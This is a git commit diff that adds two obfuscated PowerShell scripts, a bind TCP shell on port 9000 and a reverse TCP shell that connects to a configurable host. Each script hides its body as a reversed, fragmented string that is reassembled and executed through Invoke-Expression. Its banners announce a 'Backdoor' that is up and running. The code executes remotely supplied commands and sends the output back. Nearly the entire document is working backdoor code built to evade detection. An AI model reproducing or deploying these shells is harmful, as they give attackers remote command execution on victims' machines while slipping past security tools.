e5c1ab5f0f204505480dfcd8d39f9bc1a5e1276a
Ivan Šincek <35937483+ivan-sincek@users.noreply.github.com>
2021-04-13 01:41:59 +0200

    Initial Commit

---
+++ src/powershell_bind_tcp_obfuscated.ps1
@@ -0,0 +1,108 @@
+# change the port number as necessary
+# obfuscated port number, same as $p = 9000;
+$p = 1000 + 1000 + 1000 + 6000;
+$QiRa= [cHAr[] ] ")''NIOJ-]52,62,4[cEpsMOc:Vne$ ( .| )'|',)09]RaHC[+76]RaHC[+901]RaHC[((EcAlPer.)43]RaHC[]GNIrtS[,'0fC'(EcAlPer.)63]RaHC[]GNIrtS[,'XPz'(EcAlPer.)93]RaHC[]GNIrtS[,)47]RaHC[+411]RaHC[+78]RaHC[((EcAlPer.)69]RaHC[]GNIrtS[,'Pwq'(EcAlPer.)'
+}
+;)()JrWTCELJrW + JrWLOCJrW(::]CG.METSYS[
+;0fCd0fC e'+'maN- )*V-ra* MPwqCPwqGPwq( &
+;0fCr0fC emaN- )'+'*V-ra* MPwqCPwqGPwq( &
+}
+;0fCb0fC emaN- )*V-ra* MPwqCPwqGPwq( &
+;)(raelC.bXPz
+{ )llunXPz en- bXPz( fi
+}
+;0fCc0fC emaN- )*V-ra* MPwqCPwqGPwq( &
+;)(esopsiD.cXPz
+;)(esolC.cXPz
+{ )llunXPz en- cXPz( fi
+}
+;0fCt0fC emaN- )'+'*V-ra* MPwqCPwqGPw'+'q( &
+;)(esopsiD.tXP'+'z
+;)(esolC.tXPz
+{ )llunXPz en- tXPz( fi
+}
+;0'+'fCw0fC emaN- )*V-ra* MPwqCPwqGPwq('+' &
+;)(esopsiD.wXPz
+;)(esolC.wXPz   '+'
+{ )llunXPz en- wXPz( fi
+}
+;0fCl0fC emaN- )*V-ra* MPwqCPwqGPwq( &
+;)(esopsiD.revreS.lXPz
+;)(esol'+'C.revreS.lXPz
+{ )llunXPz en- lXPz( fi
+{ yllanif }
+;egasseM.noitpecx'+'ErennI.noitp'+'ecxE._XPz )??oH-e'+'* MPwqCPw'+'qGPwq( &
+{ hctac }
+;0fC!detcennocsid sah tneilC0fC )??oH-e* MPwqCPwqGPwq( &
+;)0 tg- ybXPz( elihw }
+}
+}
+}
+;0fC0fC '+'= rXPz
+;)0 tg-'+' elXPz( elihw }
+;ybXPz =- elXPz
+;ybXPz =+ ocXPz
+;))ybXPz ,ocXPz(gnirtsbus.rXPz(etirW.wXPz                                    '+'
+} ;elXPz = ybXP'+'z '+'{ esle } ;'+'htgneL.bXPz = ybXPz { )htgneL.bXPz eg- elXPz( fi
+{ od
+;0 = ocXPz
+{ )0 tg- elXPz( fi
+;htgneL.rXPz = elXPz
+;0fC0fC = dXPz
+}                               '+'
+;)????'+'?S-tu* MPwqCPwqGPwq('+' & ZCm noitpecxE._XPz = rXPz
+
+{ hctac }'+'
+;)?????S-tu* MPwqCPwqGPwq( & ZCm '+'1&>2 dXPz dnammoC- )*E-ek* MPwqCPwqGPwq( & = rXPz
+{ yrt
+{ )0 tg- htgneL.dXPz( fi
+;)(mirT.dXPz = dXPz
+{ )0 tg- ybXPz( fi
+;)elbaliavAataD.tXP'+'z( elihw }
+}
+;)ybXPz ,0 ,bXPz(gnirtSteG.eXP'+'z + dXPz = dXPz
+{ )0 tg- ybXPz( fi
+;)htgneL.bXPz ,0 ,bXPz(daeR.tXPz = y'+'bXPz
+{ od
+;)0fC>SP0fC(etirW.wXPz
+{ od
+;0 = ybXPz
+;0fC0fC )??oH-e* MPwqCPwqGPwq'+'( &
+;0fC!detcennoc sah tneilC0fC'+' )??oH-e* MPwqCPwqGPwq( &
+;eurtXPz = hsu'+'lFotuA.wXPz
+'+';)JrW)tXPz(RPwqEPwqTPwqIPwqRPwqWPwqMPw'+'qAPw'+'qEPwqRPwqTPwqSPwq.PwqOPwqIPwq )*O-we* MPwqCPwqGPwq( &JrW )*E-ek* MPwqCPwqGPwq( &( '+'= wXPz
+;gnidocnEiicsA.txeT )*O-we* MPwqCPwqGPwq( &'+' = eXPz
+;)21 - 21 + 4201( ][etyB )*O-we* MPwqCPwqGPwq( & = bXPz
+;'+')(maertSteG.cXPz = tXPz
+;)(potS.lXPz
+;)llunXPz qe- cXPz( elihw }
+}
+;005 sdnocesilliM- )*lS-t* MPwqCPwqGPwq( &
+{ esle }
+;)(0fCTPwqNPwqEPwqIPwqLPwqCPwqPPwqCPwq'+'TPwqTPwqPPwqEPwqCPwqCPwqAPwq0fC.lXPz = cXPz
+{ ))(gnidneP.lXPz( fi
+dohtem gnikcolb-non #
+{ od
+;0fC0fC )??oH-e* MPwqCPwqGPwq( &
+;0fC...tcennoc ot tneilc rof gni'+'tiaW0fC )??oH-e* MPwqCPwqGPwq( &
+;0fC0fC )??oH-e* MPwqCPwqGPwq( &
+;0fC'+'...gninnur dna pu si roodkcaB0fC )??'+'oH-e* MPwqCPwqGPwq( &
+;)(tratS.lXPz
+;)JrW)pXPz ,0f'+'C0.0.0.00fC('+'RPwqEPwqNPwqEPwqTPwqSPwqIPwqLPwqPPwqCPwqTPwq'+'.PwqS'+'PwqTP'+'wqEPwqK'+'PwqCPwqOPwqSPwq.PwqTPwqEPwqNPwq )*O-we* MPwqCPwqGPwq( &JrW )*E-ek* MPwqCPwqGPwq( &( = lXPz
+{ yrt
+;0fC0fC = rXPz
+;0fC0fC = dXPz
+;llunXPz = wXPz
+;llunXPz = bXPz
+;llunXPz = tXPz
+;ll'+'unXPz = cXPz
+;llunXPz = lXPz
+;0fC######'+'#################################################################0fC )??oH-e* MPwqCPwqGPw'+'q( &
+;0fC#'+'                                         '+'    '+'        '+'                #0fC )??oH-e* MPwqCPwqGP'+'wq( &
+;0fC#  .41Y6qtzgpL6M4uXfnbabv8NR9G7T6MZrB1 ta nioctib etanod ot eerf leeF #0fC )??oH-e'+'* '+'MPwqCPwqGPwq( &
+;0fC# .pct-es'+'rever-llehsrewop/kecnis-navi/moc.buhtig ta yrotisoper buHtiG #0fC )??oH-e* MPw'+'qCPwqGPwq( &
+'+';0fC#           '+'                      '+'      '+'                              '+'#0fC )??oH'+'-e* MPwqCPwqGPwq( &
+;0fC#               kecniS navI yb                                        #0fC )??oH-e* MPw'+'qCPwqG'+'Pwq( &
+;0fC#                    3.3v PCT dniB llehSrewoP                         #0fC )??oH-e* MPwqCPwqGPwq( &
+;0fC#    '+'                                     '+'                     '+'       #0'+'fC )??oH-e* MPwqCPwq'+'GPwq( &
+;0fC#############################################'+'#########################'+'#'+'0fC )??oH-e* MPwqCPwqGPwq( &'( " ;[aRray]::reVErSe( ( GeT-item ('vA'+'ri'+'ABle:QI'+'RA') ).vAlue);. ( $shelliD[1]+$shellId[13]+'x')( [stRING]::jOIn('' , ( GeT-item ('vA'+'ri'+'ABle:QI'+'RA') ).vAlue ) );
---
+++ src/powershell_reverse_tcp_obfuscated.ps1
@@ -0,0 +1,91 @@
+# change the host address and/or port number as necessary
+# obfuscated host address, same as $a = "127.0.0.1";
+$a = "127" + "." + "0" + "." + "0" + "." + "1";
+# obfuscated port number, same as $p = 9000;
+$p = 1000 + 1000 + 1000 + 6000;
+$2bi  =  [cHAr[] ]" ) )'`','SL2'(EcALpER.)'$','90U'(EcALpER.)43]raHC[]Gnirts[,)05]raHC[+811]raHC[+711]raHC[((EcALpER.)93]raHC[]Gnirts[,'QnD'(EcALpER.)'|',)811]raHC[+001]raHC[+96]raHC[((EcALpER.)'
+}'+'
+;)()QnDTCELQnD + '+'QnDLOCQnD(::]CG.METSYS[
+;2vud2vu emaN- )*V-ra* MSL2CSL2GSL2( &
+;2vur2vu emaN- )*V-ra* MSL2CSL2GSL2( &
+}
+;2'+'v'+'ub2vu ema'+'N- )*V-ra* MSL2CSL'+'2GSL2( &
+;)(raelC.b90U
+'+'{ )l'+'lun90U en- b90U( fi
+}
+;2v'+'uc2vu emaN- )*V-ra* MSL2CSL2GSL2( &
+;)(esopsiD'+'.c90U
+;)(esolC.c90U
+{ )llun90U en'+'- c90U( fi
+}
+;2vut2vu emaN- )*V-ra* MSL2CSL2GSL2( &
+;)(e'+'sopsi'+'D.t90U
+;)(esolC.t'+'90U        '+'
+{ )llun90U en- t90U( fi'+'
+}
+;2vuw2vu emaN'+'- )*V-ra* MSL2CSL2GSL2('+' &
+;)(esopsi'+'D.w90U
+;)(esolC.w90U
+{ '+')llun90U en- w90U( fi
+{ yllanif'+' }
+;egasseM.noitp'+'ecxErennI.noitpecxE._90U )?'+'?oH-e* MSL2CSL2GSL2( &
+{ hctac }
+;2vu.'+'..tixe won lliw roodkcaB2vu )??oH-e* MSL2'+'CSL2GSL2( &
+;)0 tg- yb90U( elihw }
+}
+}
+}
+;2vu2vu = r90U
+;)0 tg- el90U( elihw }
+;yb90U =- el90U
+;yb90U =+ oc90U'+'              '+'
+;))yb9'+'0U ,oc90U(gnirtsbus.r'+'90U(etirW.w90U
+
+} ;el90U = yb90U { esle } ;htgneL.b90U '+'= yb90U { )htgneL.b90'+'U eg- el90U( fi
+{ od
+;0 = oc90U
+{ )0 tg- el90U( fi
+;htgneL.r90U = el90U
+;2vu2vu = d90U
+}
+;)?????S-tu* MSL2CSL2GSL2( & vdE noitpecxE._90U = r90U
+
+{ h'+'ctac }
+;)?????S-t'+'u* MSL2CSL2GS'+'L2( & vdE 1&>2 d90U'+' dnammoC- )*E-ek* MSL2CSL2GSL2( & = r90U
+{ yrt
+{ )0 tg- htgneL.d90U( '+'fi
+;)(mirT.d90'+'U = d90U
+{ )0 tg- yb90U( '+'fi
+;)elbaliavAataD.t90U( elihw }
+}
+;)yb90U ,0 ,b90U(gnirtSteG.e90U + d90U = d90U
+{ )0 tg- yb90U( fi
+;)htgneL.b90U ,0 ,b90U(daeR.t90U'+' = yb90U
+{ od
+;)2vu>SP2vu(etirW.w90U
+{ od
+;0 = yb90'+'U
+;2'+'vu2vu )??oH-e* MSL2CSL2GSL2( &
+;2vu...gninnur dna pu si roodkcaB2vu )??oH-e* MSL2CSL2GSL2( &
+;eurt9'+'0U = hsulFotuA.w90U
+;)QnD)t90U(RSL2'+'ESL2TSL2ISL2RSL2WSL2MSL2ASL2ESL2RSL2TSL2SSL2.SL2OSL2ISL2 )*O-we* MSL2C'+'SL2GSL2( &QnD )*E-ek* M'+'SL2CSL2GSL2( &( = w90U
+;'+'gnidocnEiicsA.txeT )*O-w'+'e* MSL2CSL2GSL2( & = e90U
+;)21 - 21 + 4201( ][etyB )*O'+'-we* MSL2CSL2GSL2( & = b90U
+;)(ma'+'ertSteG.c90U = t90U
+;)QnD)p90U ,a90'+'U(TSL2NSL2ESL2ISL2LSL'+'2CSL2PSL2CSL2TS'+'L2.SL2SSL2T'+'SL2'+'ESL'+'2KSL2CSL2OSL2SS'+'L2.SL2TSL2ESL2NSL2 )*O-we'+'* MSL2CSL2GSL2( &QnD )*E-ek* MSL2CSL2GSL2( &( = c90U
+{ yrt
+;2vu2vu = r90U
+;2vu2vu = d90U
+;llun90U = w90U
+;llun90U = b90U
+;llun90U ='+' t90U
+;llun90U = c90'+'U
+;2'+'vu##########################################################'+'###'+'###########2vu )??oH-e'+'* MSL'+'2CSL2GSL2( &
+;2vu#                                                             '+'         #2vu )??oH-e* MSL2CSL2GSL2( &
+;2vu#   .41Y6qtzgpL6M4uXfnbabv8NR9G7T6MZrB1 ta nioctib eta'+'nod ot eerf leeF #2vu )??oH-e* MSL'+'2CSL2GSL2( &
+;2vu#  '+'.pct-esrever-llehsrewop/kecnis-navi/moc.buhtig ta yrotisoper b'+'uHtiG #2vu )??oH-'+'e* MSL2CSL2GS'+'L2( &
+;2vu'+'#                 '+'                 '+'              '+'               '+'       #2vu )??oH-e* MSL2CSL2GSL2( &
+;2vu#              kecniS navI yb                            '+'   '+'           #2'+'vu )??oH-e* MSL2CSL2GSL2( &
+;2v'+'u#    '+'               3.3v PCT esreveR lleh'+'SrewoP                        #2vu )'+'??oH-e* MS'+'L2CSL2'+'G'+'SL2( &
+;2vu#  '+'                        '+'                                            #2vu'+' )??oH-e* MSL2CSL2GSL2( &
+;2vu#######'+'###########'+'######################################################2vu )??o'+'H-e* MSL2CSL2GSL2( &'(( )'X'+]31[DILlehs$+]1[dILlehs$ ( & " ;  [aRRAy]::REVeRsE((gEt-vaRIaBLE  2Bi  -ValueOnl) ); -jOin (gEt-vaRIaBLE  2Bi  -ValueOnl)|&((gET-VArIABLe '*MdR*').NAme[3,11,2]-JoiN'');
